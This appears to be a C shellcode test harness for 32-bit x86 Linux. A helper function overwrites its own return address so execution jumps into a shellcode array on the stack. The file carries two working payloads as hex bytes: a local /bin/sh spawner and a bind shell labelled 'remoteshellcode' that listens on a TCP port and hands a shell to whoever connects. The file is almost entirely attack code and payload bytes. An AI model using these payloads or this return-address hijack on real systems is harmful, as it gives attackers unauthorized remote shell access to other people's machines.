 
/*
 * Shellcode testing
 */
static char *s;

int dummy
(void)
{
	unsigned int x;
	unsigned int *p;

	/* Have p point to x */
	p = &x;

	/* Have p point to EBP */
	p++;

	/* Have p point to the return address */
	p++;

	/* Overwrite the return address with the shellcode address */
	*p = (unsigned int)s;

	return (0);
}

int
main(void)
{
	char shellcode[] =
	"\xeb\x12\x5e\x31\xc0\x88\x46\x07"
	"\x50\x56\x31\xd2\x89\xe1\x89\xf3"
	"\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
	"\xff\x2f\x62\x69\x6e\x2f\x73\x68";

	char remoteshellcode[] =
	"\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
	"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
	"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
	"\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
	"\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
	"\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
	"\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
	"\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";
	/* Point s at the shellcode on the stack */
	s = shellcode;

	dummy();

	return (0);
}
